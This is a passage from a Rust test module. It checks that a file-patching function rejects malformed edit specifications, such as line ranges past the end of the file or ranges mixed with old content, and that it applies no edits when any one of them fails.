                serde_json::json!({"start_line": 1, "end_line": 3, "new_content": "x"}),
                "past the end",
            ),
            (
                serde_json::json!({"start_line": 1, "new_content": "x"}),
                "both start_line and end_line",
            ),
            (
                serde_json::json!({"old_content": "a", "start_line": 1, "end_line": 1, "new_content": "x"}),
                "not both",
            ),
        ] {
            // A good edit first: nothing is applied if any edit fails.
            let err = patch(
                path,
                serde_json::json!([{"old_content": "b", "new_content": "B"}, edit]),
            )
            .unwrap_err()
            .to_string();
            assert!(err.contains(expected), "{err}");
            assert_eq!(read_test_file(path), "a\nb\n");
        }
        cleanup(path);
    }
}
